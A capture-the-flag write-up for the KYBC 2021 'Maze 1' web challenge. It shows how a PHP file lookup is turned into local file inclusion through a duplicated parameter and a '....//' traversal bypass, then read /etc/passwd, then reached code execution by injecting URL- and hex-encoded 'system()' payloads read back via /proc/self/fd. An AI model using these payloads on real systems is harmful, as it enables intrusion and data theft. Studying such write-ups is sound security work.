Title: KYBC 2021 - Maze 1 Writeup
Date: 2021-03-17
Category: CTF
Tags: ctf, lfi, rce, kybc
Slug: kybc-yogosha-2021-maze-1-writeups
Author: Giulia Vergottini
Summary: Writeup for Maze 1 challenge at KYBC CTF


The site is basically a search box that checks for matching txt files and then redirects to `http://5.150.254.85:8082/lookup.php?f=file.txt` to display the content of the file. `flag.txt` obviously leads to a fake flag, but the whole thing looks like a potential LFI.

Trying to reach a file with an extension other than `.txt` results in an error. However, appending an extra `f` parameters after one with the `.txt` extension lets me bypass the extension check and access the content of the last file.

The txt files are inside a `files/` folder and there seem to be some sort of sanitization mechanism, since `../` get stripped away. However, the filter applies only to that specific pattern, so `....//` becomes `../` after sanitation and allows me to look up into the parent folder.

Combining the two bypasses together gets me the `etc/passwd` file:

```
http://5.150.254.85:8082/lookup.php?f=flag.txt&f=....//....//....//....//etc/passwd`
```

The flag doesn't seem to be there though.

Let's see if it is possible to turn this LFI into an RCE, since trying to guess name and location of the flag doesn't sound like a realistic strategy.

By examining the `proc/self/fd` folder I discover that `proc/self/fd/11` stores the serialized parameters of the search request. Let's see if we can write by making a POST request containing `<?php system('id'); ?>`

```
http://5.150.254.85:8082/search=%3C%3Fphp+system%28%27id%27%29%3B+%3F%3E&submit=submit
```
and check the proc file again

```
http://5.150.254.85:8082/lookup.php?f=flag.txt&f=....//....//....//....//proc/self/fd/11
```

Yeah! The code gets executed and the result gets saved into it!!

Let's run `ls /`
```
http://5.150.254.85:8082/search=%3C%3Fphp%20system%28%27ls%20-al%27%29%3B%20%3F%3E&submit=submit

```
and check the outcome in the proc file. No flag in the root folder, but `home/ctf_user1` seems interesting:
```
http://5.150.254.85:8082/search=%3c%3f%70%68%70%20%73%79%73%74%65%6d%28%27%6c%73%20%2d%61%6c%20%2f%68%6f%6d%65%2f%63%74%66%5f%75%73%65%72%31%27%29%3b%20%3f%3e&submit=submit
```

there's the flag - let's cat it!

```
http://5.150.254.85:8082/search=%3c%3f%70%68%70%20%73%79%73%74%65%6d%28%27%63%61%74%20%2f%68%6f%6d%65%2f%63%74%66%5f%75%73%65%72%31%2f%2e%33%33%36%64%35%65%62%63%35%34%33%36%35%33%34%65%36%31%64%31%36%65%36%33%64%64%66%63%61%33%32%37%5f%66%6c%61%67%31%2e%74%78%74%27%29%3b%20%3f%3e&submit=submit
```

Success! `FLAG_c4a66ead822b8d2dd42da826eb180371`
